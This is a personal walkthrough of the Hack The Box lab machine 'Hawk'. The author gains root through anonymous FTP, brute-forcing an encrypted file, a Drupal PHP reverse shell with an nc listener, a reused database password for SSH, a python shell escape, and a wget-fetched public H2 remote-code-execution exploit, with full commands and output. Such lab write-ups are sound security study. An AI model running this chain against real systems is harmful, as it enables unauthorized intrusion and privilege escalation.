This is my write-up/walkthrough for [the Hack The Box machine, Hawk](https://app.hackthebox.com/machines/Hawk). It's a Linux machine, rated "Medium", with 10.10.10.102 as its IP address.

![Alt text](/images/hawk/2022-03-23-hack-the-box-hawk-01.JPG "Hawk Info Card")

I started with an nmap scan—

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ sudo nmap -sC -sV -A 10.10.10.102                         
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-18 09:01 EDT
Nmap scan report for 10.10.10.102
Host is up (0.26s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.16.10
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 (RSA)
|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df (ECDSA)
|_  256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
8082/tcp open  http    H2 database http console
|_http-title: H2 Console
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=3/18%OT=21%CT=1%CU=37612%PV=Y%DS=2%DC=T%G=Y%TM=623482F
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)OPS
OS:(O1=M54BST11NW7%O2=M54BST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST1
OS:1NW7%O6=M54BST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M54BNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   384.02 ms 10.10.16.1
2   173.22 ms 10.10.10.102

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.03 seconds
```

—that told me I have got port 21 (FTP), port 22 (SSH), port 80 (HTTP), and port 8082, which is running H2 Database. Anonymous login is allowed for FTP, so my first instinct was to use that and see if it gets us somewhere.

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ ftp 10.10.10.102
Connected to 10.10.10.102.
220 (vsFTPd 3.0.3)
Name (10.10.10.102:thatvirdiguy): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
226 Directory send OK.
ftp> cd messages
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 .
drwxr-xr-x    3 ftp      ftp          4096 Jun 16  2018 ..
-rw-r--r--    1 ftp      ftp           240 Jun 16  2018 .drupal.txt.enc
226 Directory send OK.
ftp> get .drupal.txt.enc
local: .drupal.txt.enc remote: .drupal.txt.enc
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .drupal.txt.enc (240 bytes).
226 Transfer complete.
240 bytes received in 0.00 secs (5.2019 MB/s)
ftp> 
221 Goodbye.
```

I got a file, called "`.drupal.txt.enc`", but it was encrypted—

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ cat .drupal.txt.enc 
U2FsdGVkX19rWSAG1JNpLTawAmzz/ckaN1oZFZewtIM+e84km3Csja3GADUg2jJb
CmSdwTtr/IIShvTbUd0yQxfe9OuoMxxfNIUN/YPHx+vVw/6eOD+Cc1ftaiNUEiQz
QUf9FyxmCb2fuFoOXGphAMo+Pkc2ChXgLsj4RfgX+P7DkFa8w1ZA9Yj7kR+tyZfy
t4M0qvmWvMhAj3fuuKCCeFoXpYBOacGvUHRGywb4YCk=

┌──(thatvirdiguy㉿kali)-[~]
└─$ file .drupal.txt.enc 
.drupal.txt.enc: openssl enc'd data with salted password, base64 encoded
```

—so pretty useless until we figure out a way to decrypt it.

A quick google search led me to [deltaclock's go-openssl-bruteforce](https://github.com/deltaclock/go-openssl-bruteforce) and though it took me a while to figure out how to use it—

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ git clone https://github.com/deltaclock/go-openssl-bruteforce.git
Cloning into 'go-openssl-bruteforce'...
remote: Enumerating objects: 31, done.
remote: Total 31 (delta 0), reused 0 (delta 0), pack-reused 31
Receiving objects: 100% (31/31), 1.72 MiB | 1.28 MiB/s, done.
Resolving deltas: 100% (13/13), done.
                                                                                                                                                                                             
┌──(thatvirdiguy㉿kali)-[~]
└─$ cd go-openssl-bruteforce/
                                                                                                                                                                                             
┌──(thatvirdiguy㉿kali)-[~/go-openssl-bruteforce]
└─$ go build -o openssl-brute
go: cannot find main module, but found .git/config in /home/thatvirdiguy/go-openssl-bruteforce
        to create a module there, run:
        go mod init
                                                                                                                                                                                             
┌──(thatvirdiguy㉿kali)-[~/go-openssl-bruteforce]
└─$ go mod init                                                                                                                                                                          1 ⨯
go: cannot determine module path for source directory /home/thatvirdiguy/go-openssl-bruteforce (outside GOPATH, module path must be specified)

Example usage:
        'go mod init example.com/m' to initialize a v0 or v1 module
        'go mod init example.com/m/v2' to initialize a v2 module

Run 'go help mod init' for more information.

┌──(thatvirdiguy㉿kali)-[~/go-openssl-bruteforce]
└─$ go mod init /home/thatvirdiguy/go-openssl-bruteforce                                                                                                                                         1 ⨯
go: malformed module path "/home/thatvirdiguy/go-openssl-bruteforce": empty path element
                                                                                                                                                                                             
┌──(thatvirdiguy㉿kali)-[~/go-openssl-bruteforce]
└─$ go mod init home/thatvirdiguy/go-openssl-bruteforce                                                                                                                                          1 ⨯
go: creating new go.mod: module home/thatvirdiguy/go-openssl-bruteforce
go: to add module requirements and sums:
        go mod tidy

┌──(thatvirdiguy㉿kali)-[~/go-openssl-bruteforce]
└─$ go mod tidy
```

—but, once I did, I got what I needed—

```
┌──(thatvirdiguy㉿kali)-[~/go-openssl-bruteforce]
└─$ ./openssl-brute -file .drupal.txt.enc 
Bruteforcing Started
CRACKED!! Results in file [ result-aes-256-cbc ]
--------------------------------------------------
Found password [ friends ] using [ aes-256-cbc ] algorithm!!
--------------------------------------------------
Daniel,

Following the password for the portal:

PencilKeyboardScanner123

Please let us know when the portal is ready.

Kind Regards,

IT department

--------------------------------------------------
```

—but I had no idea where to use this password. So, I decided to move on to the next bit and try that open port 80. That got me to the following:

![Alt text](/images/hawk/2022-03-23-hack-the-box-hawk-02.jpg "Drupal Console")

I tried daniel:PencilKeyboardScanner123, based on that decrypted file output, but that didn't work. I then tried admin:PencilKeyboardScanner123, and that got me in.

![Alt text](/images/hawk/2022-03-23-hack-the-box-hawk-03.jpg "Drupal Access")

I looked around for a bit, trying to chalk out my next move, but it looked like I had hit a brick wall until I figured out that it might be possible to execute some PHP snippets in the console. I enabled it first—

![Alt text](/images/hawk/2022-03-23-hack-the-box-hawk-04.JPG "Drupal PHP")

—and then ran a test command to see it actually does work and I'm not getting ahead of myself.

![Alt text](/images/hawk/2022-03-23-hack-the-box-hawk-05.JPG "PHP whoami-1")

It worked, indeed.

![Alt text](/images/hawk/2022-03-23-hack-the-box-hawk-06.jpg "PHP whoami-2")

The next step was to try and see if I could get a reverse shell off this. And thanks to [rshipp's shell.php](https://gist.github.com/rshipp/eee36684db07d234c1cc), I was able to do exactly that. Ran the following on the console—

![Alt text](/images/hawk/2022-03-23-hack-the-box-hawk-07.JPG "PHP reverse shell")

—with an `nc` listening on port 1234 on my machine.

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ nc -lvp 1234                                                                                                                                                                                              1 ⨯
listening on [any] 1234 ...

```

Looking around for a bit got me the user flag—

```
10.10.10.102: inverse host lookup failed: Unknown host                                                                                                                                                            
connect to [10.10.16.21] from (UNKNOWN) [10.10.10.102] 49326                                                                                                                                                      
bash: cannot set terminal process group (862): Inappropriate ioctl for device                                                                                                                                     
bash: no job control in this shell                                                                                                                                                                                
www-data@hawk:/var/www/html$                                                                    
www-data@hawk:/var/www/html$ ls
ls
CHANGELOG.txt
COPYRIGHT.txt
INSTALL.mysql.txt
INSTALL.pgsql.txt
INSTALL.sqlite.txt
INSTALL.txt
LICENSE.txt
MAINTAINERS.txt
README.txt
UPGRADE.txt
authorize.php
cron.php
includes
index.php
install.php
misc
modules
profiles
robots.txt
scripts
sites
themes
update.php
web.config
xmlrpc.php
www-data@hawk:/var/www/html$ cd ../../../
cd ../../../
www-data@hawk:/$ ls
ls
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
www-data@hawk:/$ cd home
cd home
www-data@hawk:/home$ ls
ls
daniel
www-data@hawk:/home$ cd daniel
cd daniel
www-data@hawk:/home/daniel$ ls
ls
user.txt
www-data@hawk:/home/daniel$ cat user.txt
cat user.txt
166c75aea8154d5244bce8c6afb409ff
www-data@hawk:/home/daniel$
```

—but I had limited access.

```

www-data@hawk:/home/daniel$ cd ../../
cd ../../
www-data@hawk:/$ ls
ls
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
www-data@hawk:/$ cd root
cd root
bash: cd: root: Permission denied
www-data@hawk:/$ 

```

So, the only option I was left with was to look around some more and see if I can get my hands on something interesting.

```
www-data@hawk:/var/www/html$ ls -la
ls -la
total 296
drwxr-xr-x  9 root     root       4096 Jul 27  2021 .
drwxr-xr-x  3 root     root       4096 Jun 11  2018 ..
-rw-r--r--  1 www-data www-data   6104 Jun 11  2018 .htaccess
-rwxr-x---  1 www-data www-data 111859 Jun 11  2018 CHANGELOG.txt
-rwxr-x---  1 www-data www-data   1481 Jun 11  2018 COPYRIGHT.txt
-rwxr-x---  1 www-data www-data   1717 Jun 11  2018 INSTALL.mysql.txt
-rwxr-x---  1 www-data www-data   1874 Jun 11  2018 INSTALL.pgsql.txt
-rwxr-x---  1 www-data www-data   1298 Jun 11  2018 INSTALL.sqlite.txt
-rwxr-x---  1 www-data www-data  17995 Jun 11  2018 INSTALL.txt
-rwxr-x---  1 www-data www-data  18092 Jun 11  2018 LICENSE.txt
-rwxr-x---  1 www-data www-data   8710 Jun 11  2018 MAINTAINERS.txt
-rwxr-x---  1 www-data www-data   5382 Jun 11  2018 README.txt
-rwxr-x---  1 www-data www-data  10123 Jun 11  2018 UPGRADE.txt
-rwxr-x---  1 www-data www-data   6604 Jun 11  2018 authorize.php
-rwxr-x---  1 www-data www-data    720 Jun 11  2018 cron.php
drwxr-x---  4 www-data www-data   4096 Jun 11  2018 includes
-rwxr-x---  1 www-data www-data    529 Jun 11  2018 index.php
-rwxr-x---  1 www-data www-data    703 Jun 11  2018 install.php
drwxr-x---  4 www-data www-data   4096 Jun 11  2018 misc
drwxr-x--- 42 www-data www-data   4096 Jul 27  2021 modules
drwxr-x---  5 www-data www-data   4096 Jun 11  2018 profiles
-rwxr-x---  1 www-data www-data   2189 Jun 11  2018 robots.txt
drwxr-x---  2 www-data www-data   4096 Jun 11  2018 scripts
drwxr-x---  4 www-data www-data   4096 Jul 27  2021 sites
drwxr-x---  7 www-data www-data   4096 Jul 27  2021 themes
-rwxr-x---  1 www-data www-data  19986 Jun 11  2018 update.php
-rwxr-x---  1 www-data www-data   2200 Jun 11  2018 web.config
-rwxr-x---  1 www-data www-data    417 Jun 11  2018 xmlrpc.php
www-data@hawk:/var/www/html$ cat authorize.php | grep -i passw
cat authorize.php | grep -i passw
www-data@hawk:/var/www/html$ cd scripts
cd scripts
www-data@hawk:/var/www/html/scripts$ ls -la
ls -la
total 92
drwxr-x--- 2 www-data www-data  4096 Jun 11  2018 .
drwxr-xr-x 9 root     root      4096 Jul 27  2021 ..
-rwxr-x--- 1 www-data www-data   569 Jun 11  2018 code-clean.sh
-rwxr-x--- 1 www-data www-data    66 Jun 11  2018 cron-curl.sh
-rwxr-x--- 1 www-data www-data    78 Jun 11  2018 cron-lynx.sh
-rwxr-x--- 1 www-data www-data  4264 Jun 11  2018 drupal.sh
-rwxr-x--- 1 www-data www-data  2955 Jun 11  2018 dump-database-d6.sh
-rwxr-x--- 1 www-data www-data  2573 Jun 11  2018 dump-database-d7.sh
-rwxr-x--- 1 www-data www-data  6872 Jun 11  2018 generate-d6-content.sh
-rwxr-x--- 1 www-data www-data 10790 Jun 11  2018 generate-d7-content.sh
-rwxr-x--- 1 www-data www-data  2367 Jun 11  2018 password-hash.sh
-rwxr-x--- 1 www-data www-data 25474 Jun 11  2018 run-tests.sh
-rwxr-x--- 1 www-data www-data   185 Jun 11  2018 test.script
www-data@hawk:/var/www/html/scripts$ cat password-hash.sh | grep -i passw
cat password-hash.sh | grep -i passw
 * Drupal hash script - to generate a hash from a plaintext password
 * @param password1 [password2 [password3 ...]]
 *  Plain-text passwords in quotes (or with spaces backslash escaped).
Generate Drupal password hashes from the shell.
Usage:        {$script} [OPTIONS] "<plan-text password>"
Example:      {$script} "mynewpassword"
  "<password1>" ["<password2>" ["<password3>" ...]]
              One or more plan-text passwords enclosed by double quotes. The
              change a password via SQL to a known value.
$passwords = array();
      // Add a password to the list to be processed.
      $passwords[] = $param;
include_once DRUPAL_ROOT . '/includes/password.inc';
foreach ($passwords as $password) {
  print("\npassword: $password \t\thash: ". user_hash_password($password) ."\n");
www-data@hawk:/var/www/html/scripts$ cd ../sites
cd ../sites
www-data@hawk:/var/www/html/sites$ ls -la
ls -la
total 24
drwxr-x--- 4 www-data www-data 4096 Jul 27  2021 .
drwxr-xr-x 9 root     root     4096 Jul 27  2021 ..
-rwxr-x--- 1 www-data www-data  904 Jun 11  2018 README.txt
drwxr-x--- 5 www-data www-data 4096 Jul 27  2021 all
dr-xr-x--- 3 www-data www-data 4096 Jul 27  2021 default
-rwxr-x--- 1 www-data www-data 2365 Jun 11  2018 example.sites.php
www-data@hawk:/var/www/html/sites$ cat README.txt | grep -i passw
cat README.txt | grep -i passw
www-data@hawk:/var/www/html/sites$ cd all
cd all
www-data@hawk:/var/www/html/sites/all$ ls -la
ls -la
total 20
drwxr-x--- 5 www-data www-data 4096 Jul 27  2021 .
drwxr-x--- 4 www-data www-data 4096 Jul 27  2021 ..
drwxr-x--- 2 www-data www-data 4096 Jun 11  2018 libraries
drwxr-x--- 2 www-data www-data 4096 Jun 11  2018 modules
drwxr-x--- 2 www-data www-data 4096 Jul 27  2021 themes
www-data@hawk:/var/www/html/sites/all$ cd ../default
cd ../default
www-data@hawk:/var/www/html/sites/default$ ls -la
ls -la
total 68
dr-xr-x--- 3 www-data www-data  4096 Jul 27  2021 .
drwxr-x--- 4 www-data www-data  4096 Jul 27  2021 ..
-rwxr-x--- 1 www-data www-data 26250 Jun 11  2018 default.settings.php
drwxrwxr-x 3 www-data www-data  4096 Jul 27  2021 files
-r--r--r-- 1 www-data www-data 26556 Jun 11  2018 settings.php
www-data@hawk:/var/www/html/sites/default$ cat settings.php | grep -i passw
cat settings.php | grep -i passw
 *   'password' => 'password',
 * username, password, host, and database name.
 *   'password' => 'password',
 *   'password' => 'password',
 *     'password' => 'password',
 *     'password' => 'password',
      'password' => 'drupal4hawk',
 * by using the username and password variables. The proxy_user_agent variable
# $conf['proxy_password'] = '';
www-data@hawk:/var/www/html/sites/default$
```

I got a password, but I was unsure where to use. Until, that is, I went through the results of the nmap scan again and recalled that SSH is open. Going by that password, I figured it belonged to a user called "`drupal`", but that wasn't the case.

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ ssh drupal@10.10.10.102
The authenticity of host '10.10.10.102 (10.10.10.102)' can't be established.
ED25519 key fingerprint is SHA256:jcuqa44g/a1pFArv7e9IFSswe7plzlg2gNBVim3xXhY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.102' (ED25519) to the list of known hosts.
drupal@10.10.10.102's password: 
Permission denied, please try again.
drupal@10.10.10.102's password: 

```

I tried "`daniel`", since that was the once other username I had come across so far. It worked—

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ ssh daniel@10.10.10.102
daniel@10.10.10.102's password: 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Mar 23 16:51:05 UTC 2022

  System load:  0.08              Processes:           169
  Usage of /:   47.5% of 7.32GB   Users logged in:     0
  Memory usage: 43%               IP address for eth0: 10.10.10.102
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

417 packages can be updated.
268 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Mar 23 16:50:33 2022 from 10.10.16.21
Python 3.6.5 (default, Apr  1 2018, 05:46:30) 
[GCC 7.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>>
```

—but I got a python3 interpreter instead of bash shell. A quick google search led me [here](https://codefather.tech/blog/shell-command-python/) and I was able to execute shell commands.

```
>>> import os
>>> os.system('date')
Wed Mar 23 16:57:37 UTC 2022
0
>>> os.system('/bin/bash')
daniel@hawk:~$ pwd
/home/daniel
daniel@hawk:~$ cd ../
daniel@hawk:/home$ ls -la
total 12
drwxr-xr-x  3 root   root   4096 Jun 16  2018 .
drwxr-xr-x 23 root   root   4096 Jul 27  2021 ..
drwxr-xr-x  5 daniel daniel 4096 Jul 27  2021 daniel
daniel@hawk:/home$ sudo su -
[sudo] password for daniel: 
daniel is not in the sudoers file.  This incident will be reported.
daniel@hawk:/home$ 
```

Oops.

I needed another way in. I figured I'll try the one bit on the list I hadn't checked so far—

![Alt text](/images/hawk/2022-02-23-hack-the-box-hawk-08.jpg "H2 Database")

—but it didn't look like something I could exploit via the browser.

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ searchsploit H2 Database
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
H2 Database - 'Alias' Arbitrary Code Execution                                                                                                                                  | java/local/44422.py
H2 Database 1.4.196 - Remote Code Execution                                                                                                                                     | java/webapps/45506.py
H2 Database 1.4.197 - Information Disclosure                                                                                                                                    | linux/webapps/45105.py
H2 Database 1.4.199 - JNI Code Execution                                                                                                                                        | java/local/49384.txt
Oracle Database 10 g - XML DB xdb.xdb_pitrig_pkg Package PITRIG_TRUNCATE Function Overflow                                                                                      | multiple/remote/31010.sql
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

That remote code execution bit looked interesting, so I decided to give it a shot.

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ searchsploit -m 45506   
  Exploit: H2 Database 1.4.196 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/45506
     Path: /usr/share/exploitdb/exploits/java/webapps/45506.py
File Type: Python script, UTF-8 Unicode text executable

Copied to: /home/thatvirdiguy/45506.py

┌──(thatvirdiguy㉿kali)-[~]
└─$ python3 45506.py --help
usage: 45506.py [-h] -H 127.0.0.1:8082 [-d jdbc:h2:~/emptydb-je5iG]

optional arguments:
  -h, --help            show this help message and exit
  -H 127.0.0.1:8082, --host 127.0.0.1:8082
                        Specify a host
  -d jdbc:h2:~/emptydb-je5iG, --database-url jdbc:h2:~/emptydb-je5iG
                        Database URL
```

Ran a simple HTTP server on my machine—

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ python3 -m http.server 8080                                                                                                                                                                               1 ⨯
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...

```

—and since I already had some access on the target machine, I got it to download this file.

```
daniel@hawk:~$ wget 10.10.16.21:8080/45506.py
--2022-03-23 17:38:37--  http://10.10.16.21:8080/45506.py
Connecting to 10.10.16.21:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3756 (3.7K) [text/x-python]
Saving to: ‘45506.py’

45506.py                                             100%[====================================================================================================================>]   3.67K  --.-KB/s    in 0.007s  

2022-03-23 17:38:38 (545 KB/s) - ‘45506.py’ saved [3756/3756]

daniel@hawk:~$ ls -la | grep py
-rw-rw-r-- 1 daniel daniel 3756 Mar 23 17:19 45506.py
lrwxrwxrwx 1 daniel daniel    9 Jul  1  2018 .python_history -> /dev/null
daniel@hawk:~$ chmod 777 45506.py 
daniel@hawk:~$ ls -la | grep py
-rwxrwxrwx 1 daniel daniel 3756 Mar 23 17:19 45506.py
lrwxrwxrwx 1 daniel daniel    9 Jul  1  2018 .python_history -> /dev/null
daniel@hawk:~$
```

All that remained next was to get the root flag.

```
daniel@hawk:~$ python3 45506.py -H 127.0.0.1:8082
[*] Attempting to create database
[+] Created database and logged in
[*] Sending stage 1
[+] Shell succeeded - ^c or quit to exit
h2-shell$ id
uid=0(root) gid=0(root) groups=0(root)

h2-shell$ 



[-] Invalid command (list index out of range)
h2-shell$ [-] Invalid command (list index out of range)
h2-shell$ [-] Invalid command (list index out of range)
h2-shell$ [-] Invalid command (list index out of range)
h2-shell$ pwd   
/root

h2-shell$ ls 
emptydb-ePSxL.mv.db
emptydb-ePSxL.trace.db
root.txt
test.mv.db
test.trace.db

h2-shell$ cat root.txt           
cd1a3f01610e293c5132eca1933c9e20

h2-shell$ 
```




